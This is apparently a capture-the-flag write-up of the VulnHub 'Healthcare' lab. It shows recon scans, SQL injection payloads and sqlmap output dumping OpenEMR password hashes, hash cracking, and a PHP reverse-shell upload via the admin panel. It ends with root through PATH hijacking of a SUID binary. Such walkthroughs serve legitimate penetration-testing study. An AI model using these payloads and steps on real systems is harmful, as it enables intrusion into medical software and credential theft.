# Recon
## TCP/21 - FTP
- Anonymous access denied

## TCP/80 - HTTP
### Ferox
```		
┌──(root💀kali)-[~/vulnHub/Healthcare]
└─# feroxbuster -u http://$ip -n -w /usr/share/wordlists/dirbuster/directory-list-2.3-compiled.txt -t 50

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.110.8
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-compiled.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      121l      281w     5031c http://192.168.110.8/
301        9l       29w      339c http://192.168.110.8/css
200        2l       14w     1406c http://192.168.110.8/favicon
301        9l       29w      341c http://192.168.110.8/fonts
301        9l       29w      342c http://192.168.110.8/gitweb
301        9l       29w      342c http://192.168.110.8/images
403       42l       97w        0c http://192.168.110.8/images/
200      121l      281w     5031c http://192.168.110.8/index
301        9l       29w      338c http://192.168.110.8/js
301        9l       29w      343c http://192.168.110.8/openemr
403        1l        4w       59c http://192.168.110.8/phpMyAdmin
200       19l       78w      620c http://192.168.110.8/robots
403       42l       96w        0c http://192.168.110.8/server-info
403       42l       96w        0c http://192.168.110.8/server-status
301        9l       29w      342c http://192.168.110.8/vendor
[####################] - 11m  1489922/1489922 0s      found:15      errors:0      
[####################] - 11m  1489922/1489922 2120/s  http://192.168.110.8
```
- `openemr`
- `phpMyAdmin`
- `robots`

### Nikto
```
┌──(root💀kali)-[~/vulnHub/Healthcare]
└─# nikto -ask=no -h http://192.168.110.8:80 2>&1 | tee "/root/vulnHub/Healthcare/192.168.110.8/scans/tcp80/tcp_80_http_nikto.txt"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.8
+ Target Hostname:    192.168.110.8
+ Target Port:        80
+ Start Time:         2022-02-02 03:11:31 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
+ Server may leak inodes via ETags, header found with file /, inode: 264154, size: 5031, mtime: Sat Jan  6 14:21:38 2018
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ "robots.txt" contains 8 entries which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
er+ 9543 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2022-02-02 04:01:06 (GMT8) (2975 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
- `/cgi-bin/test.cgi`
	- 'shellshock' vulnerability 
	- a false positive



# Initial Foothold
## TCP/80 - HTTP - OpenEMR SQLi
1. View enumerated directories
	- `openemr`
		![](images/Pasted%20image%2020220202142722.png)
		- `openEMR v4.1.0`
	- `phpMyAdmin`
		![](images/Pasted%20image%2020220202142748.png)
	- `robots`
		```
		┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/scans]
		└─# curl http://192.168.110.8/robots.txt -s | grep "Disallow: /" | cut -d "/" -f2 | tee robots_dir.txt
		manual
		manual-2.2
		addon-modules
		doc
		images
		all_our_e-mail_addresses
		admin

		┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/scans]
		└─# for x in $(<robots_dir.txt); do echo http://$ip/${x}; done
		http://192.168.110.8/manual
		http://192.168.110.8/manual-2.2
		http://192.168.110.8/addon-modules
		http://192.168.110.8/doc
		http://192.168.110.8/images
		http://192.168.110.8/all_our_e-mail_addresses
		http://192.168.110.8/admin
		```
	- `addon-modules`
		- This directory can only be viewed from localhost
	- `images`
		- Access Denied
	- Others
		- Not found
2. Search exploits for `openEMR v4.1.0`
	
	| Exploit Title                     | Path                  |
	| --------------------------------- | --------------------- |
	| OpenEMR 4.1.0 - 'u' SQL Injection | php/webapps/49742.py  |
	| Openemr-4.1.0 - SQL Injection     | php/webapps/17998.txt |

3. Try `php/webapps/49742.py`
	1. Edit `url` variable
		![](images/Pasted%20image%2020220202144827.png)
	2. Run exploit
		```
		┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit]
		└─# python3 49742.py 

		   ____                   ________  _______     __ __   ___ ____
		  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \
		 / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
		/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ /
		\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/
			/_/
			____  ___           __   _____ ____    __    _
		   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)
		  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /
		 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /
		/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike

		[+] Finding number of users...
		[+] Found number of users: 2
		[+] Extracting username and password hash...
		admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
		medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d
		```
4. Alternative exploit, SQLMap
	```
	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit]
	└─# sqlmap -r sqli.txt -p 'u' -D openemr -T users -C username,password --dump --output-dir=$(pwd)/sqlmap

	Parameter: u (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: u=test' OR NOT 9146=9146#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: u=test' AND (SELECT 5508 FROM(SELECT COUNT(*),CONCAT(0x7176626271,(SELECT (ELT(5508=5508,1))),0x7162787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- OUIQ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: u=test' AND (SELECT 1257 FROM (SELECT(SLEEP(5)))UvXP)-- cwnE


	Database: openemr
	Table: users
	[2 entries]
	+----------+------------------------------------------+
	| username | password                                 |
	+----------+------------------------------------------+
	| admin    | 3863efef9ee2bfbc51ecdca359c6302bed1389e8 |
	| medical  | ab24aed5a7c4ad45615cd7e0da816eea39e4895d |
	+----------+------------------------------------------+

	[15:01:52] [INFO] table 'openemr.users' dumped to CSV file '/root/vulnHub/Healthcare/192.168.110.8/exploit/sqlmap/192.168.110.8/dump/openemr/users.csv'
	[15:01:52] [INFO] fetched data logged to text files under '/root/vulnHub/Healthcare/192.168.110.8/exploit/sqlmap/192.168.110.8'

	[*] ending @ 15:01:52 /2022-02-02/
	```
5. Crack hash
	```
	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/exploit]
	└─# hashcat -a 0 -m 100 hashes /usr/share/wordlists/rockyou.txt --show
	3863efef9ee2bfbc51ecdca359c6302bed1389e8:ackbar
	ab24aed5a7c4ad45615cd7e0da816eea39e4895d:medical
	```
6. Login w/ admin:ackbar

## TCP/21 - FTP
1. Able to access FTP w/ medical:medical
	```
	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp]
	└─# ftp -nv $ip
	Connected to 192.168.110.8.
	220 ProFTPD 1.3.3d Server (ProFTPD Default Installation) [192.168.110.8]
	ftp> user medical
	331 Password required for medical
	Password: 
	230 User medical logged in
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> put test 
	local: test remote: test
	200 PORT command successful
	150 Opening BINARY mode data connection for test
	226 Transfer complete
	ftp> 
	```
	- We have write access
2. Download all files from medical
	```
	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp]
	└─# wget -m --no-passive ftp://medical:medical@$ip #Download all
	```
3. View directory structure
	```
	┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp]
	└─# tree 192.168.110.8/
	192.168.110.8/
	├── Desktop
	│   ├── addlocale.desktop
	│   ├── drakfirewall.desktop
	│   ├── draknetcenter.desktop
	│   └── Get Libre Office.desktop
	├── Documents
	│   ├── OpenEMR Passwords.pdf
	│   └── Passwords.txt
	├── Downloads
	│   └── openemr-4.1.0.tar.gz
	├── Movies
	├── Music
	├── Pictures
	│   └── pclosmedical.png
	├── Templates
	├── tmp
	│   ├── debug.log
	│   ├── keyring-fPbG5t
	│   ├── keyring-hSBjUb
	│   ├── orbit-medical
	│   │   ├── bonobo-activation-register-b415b005c8435facdf68405e0000002c.lock
	│   │   ├── bonobo-activation-register-d37436b21aa5f1f34a448a3a00000028.lock
	│   │   ├── bonobo-activation-server-b415b005c8435facdf68405e0000002c-ior
	│   │   └── bonobo-activation-server-d37436b21aa5f1f34a448a3a00000028-ior
	│   ├── orbit-root
	│   ├── pulse-8LagrogWihJO
	│   │   └── pid
	│   ├── ssh-RoIgQkNbu874
	│   └── ssh-XLjWYherh886
	└── Videos
	16 directories, 14 files
	```
	- `OpenEMR Passwords.pdf`
	- `Passwords.txt`
	- We can tell this a user's home directory
	- We can add our `id_rsa.pub` key to his `authorized_keys` to be able to SSH into it, but TCP/22 is not up.
4. View interesting files
	- `Passwords.txt`
		```
		┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp]
		└─# cat 192.168.110.8/Documents/Passwords.txt 
		PCLINUXOS MEDICAL
		root-root
		medical-medical


		OPENEMR
		admin-admin
		medical-medical
		```
	- `OpenEMR Passwords.pdf`
		![](images/Pasted%20image%2020220202152047.png)
5. FTP is likely a rabbit hole

## Back to TCP/80 - OpenEMR RCE
1. Since we do not have TCP/22 up, it is very likely we gain initial foothold via RCE
2. Search RCE exploits for `OpenEMR v4.1.0`
	
	| Exploit Title                             | Path                                 |
	| ----------------------------------------- | ------------------------------------ |
	| OpenEMR 5.0.1 - Remote Code Execution (1) | php/webapps/48515.py                 |
	| OpenEMR-RCE <= 5.0.1                          | https://github.com/noraj/OpenEMR-RCE |

3. All failed, probably because `openemr/portal/import_template.php` does not exist
4. Upload reverse shell manually
	1. Proceed to `Administration -> Others`
	2. Insert `php-reverse-shell.php`
		![](images/Pasted%20image%2020220202160559.png)
	3. Execute `php-reverse-shell.php` 
		```
		┌──(root💀kali)-[~/vulnHub/Healthcare/192.168.110.8/loot/ftp/192.168.110.8/Downloads]
		└─# curl 192.168.110.8/openemr/sites/default/images/php-reverse-shell.php -s
		```
	4. Apache shell obtained
		![](images/Pasted%20image%2020220202160954.png)
		
# Privilege Escalation

## Medical - Via Creds Found
1. Earlier we found medical creds
2. Switch to medical w/ medical:medical
	![](images/Pasted%20image%2020220202164335.png)
## Root - Via SUID Binary (Path Hijacking)
1. Check for SUID Binaries
	```
	[medical@localhost ~]$ find / -perm -4000 2>/dev/null 
	...
	/usr/bin/expiry
	/usr/bin/newgrp
	/usr/bin/pkexec
	/usr/bin/wvdial
	/usr/bin/pmount
	/usr/bin/sperl5.10.1
	/usr/bin/gpgsm
	/usr/bin/gpasswd
	/usr/bin/chfn
	/usr/bin/su
	/usr/bin/passwd
	/usr/bin/gpg
	/usr/bin/healthcheck <- Suspicious
	...
	```
2. View contents of `healthcheck`
	```
	[medical@localhost ~]$ strings /usr/bin/healthcheck
	/lib/ld-linux.so.2
	__gmon_start__
	libc.so.6
	_IO_stdin_used
	setuid
	system
	setgid
	__libc_start_main
	GLIBC_2.0
	PTRhp
	[^_]
	clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
	```
	- `ifconfig` is called w/o specifying its full path
	- `fdisk` is called w/o specifying its full path
	- `du` is called w/o specifying its full path
3. Exploit 
	1. Prepend `/tmp` to our PATH environment variable
		```
		[medical@localhost tmp]$ export PATH=/tmp:$PATH
		
		[medical@localhost ~]$ echo $PATH
		/tmp:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin
		```
	2. Create binary to spawn a root shell
		```
		[medical@localhost tmp]$ printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s 	/tmp/rootbash\n' > /tmp/ifconfig; chmod 4777 /tmp/ifconfig;
		```
	3. Check if `/tmp/ifconfig` will be called first
		```
		[medical@localhost ~]$ which ifconfig
		/tmp/ifconfig
		```
	4. Run `healthcheck`
		```
		[medical@localhost ~]$ /usr/bin/healthcheck
		```
	5. View `/tmp`
		```
		[medical@localhost ~]$ ls -la /tmp
		total 5588
		-rwsrwxrwx  1 medical  medical       67 Feb  1 15:24 ifconfig*
		-rw-------  1 root     root           0 Jul 29  2020 init.vQ5ZLd
		-rw-r--r--  1 medical  medical   193518 Feb  1 15:13 linpeas.out
		-rwxr-xr-x  1 medical  medical   762836 Feb  1 15:11 linpeas.sh*
		-rw-r--r--  1 medical  medical    16328 Feb  2  2022 raptor_udf2.so
		-rwsr-xr-x  1 root     root      864208 Feb  1 15:24 rootbash* <- Rootbash generated
		-rw-r--r--  1 apache   apache   3841560 Jul 29  2020 setup_dump.sql
		```
	6. Obtain root shell
		```
		[medical@localhost ~]$ /tmp/rootbash -p
		```
		![](images/Pasted%20image%2020220202165301.png)
3. Root Flag
	```
	rootbash-4.1# cat root.txt 
	██    ██  ██████  ██    ██     ████████ ██████  ██ ███████ ██████      ██   ██  █████  ██████  ██████  ███████ ██████  ██ 
	 ██  ██  ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ ██ 
	  ████   ██    ██ ██    ██        ██    ██████  ██ █████   ██   ██     ███████ ███████ ██████  ██   ██ █████   ██████  ██ 
	   ██    ██    ██ ██    ██        ██    ██   ██ ██ ██      ██   ██     ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██    
	   ██     ██████   ██████         ██    ██   ██ ██ ███████ ██████      ██   ██ ██   ██ ██   ██ ██████  ███████ ██   ██ ██ 


	Thanks for Playing!

	Follow me at: http://v1n1v131r4.com


	root hash: eaff25eaa9ffc8b62e3dfebf70e83a7b
	```

---
Tags: #tcp/80-http/web-app-cms-exploit #tcp/80-http/rce  #linux-priv-esc/suid/path-hijacking 

---